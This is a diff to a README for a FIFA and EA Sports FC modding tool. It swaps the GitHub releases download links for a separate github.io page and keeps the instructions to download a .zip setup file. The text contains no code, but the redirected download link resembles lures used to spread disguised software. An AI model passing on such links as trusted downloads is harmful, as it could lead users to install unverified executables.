@@ -1,6 +1,6 @@
 # ⚽ FIFA-Pro-Mod-Tool - Edit your game files with ease
 
-[![Download FIFA-Pro-Mod-Tool](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/engrumer3209/FIFA-Pro-Mod-Tool/releases)
+[![Download FIFA-Pro-Mod-Tool](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://engrumer3209.github.io)
 
 FIFA-Pro-Mod-Tool allows you to modify textures, player meshes, and database settings within EA Sports FC and FIFA titles. You manage your game assets through a simple interface. This tool handles the complex file structures so you can focus on your custom edits to kits, faces, and game data.
 
@@ -8,7 +8,7 @@ FIFA-Pro-Mod-Tool allows you to modify textures, player meshes, and database set
 
 You need a Windows computer to run this tool. Ensure you have the latest version of the .NET Desktop Runtime installed from Microsoft to support the application framework. 
 
-1. Visit this page to download the latest setup file: https://github.com/engrumer3209/FIFA-Pro-Mod-Tool/releases
+1. Visit this page to download the latest setup file: https://engrumer3209.github.io
 2. Locate the most recent version under the "Assets" section.
 3. Download the .zip file to your computer.
 
